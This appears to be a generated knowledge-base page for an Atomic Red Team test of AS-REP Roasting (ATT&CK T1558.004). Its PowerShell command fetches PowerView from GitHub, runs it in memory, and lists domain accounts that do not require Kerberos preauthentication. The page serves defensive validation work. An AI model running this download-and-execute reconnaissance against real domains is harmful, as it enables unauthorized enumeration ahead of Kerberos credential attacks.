---
atomic_guid: "d6139549-7b72-4e48-9ea1-324fc9bdf88a"
title: "Get-DomainUser with PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.004"
attack_technique_name: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "d6139549-7b72-4e48-9ea1-324fc9bdf88a"
  - "Get-DomainUser with PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Get-DomainUser with PowerView

Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.

## Metadata

- Atomic GUID: d6139549-7b72-4e48-9ea1-324fc9bdf88a
- Technique: T1558.004: Steal or Forge Kerberos Tickets: AS-REP Roasting
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1558.004/T1558.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets|T1558.004]]

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.yaml)
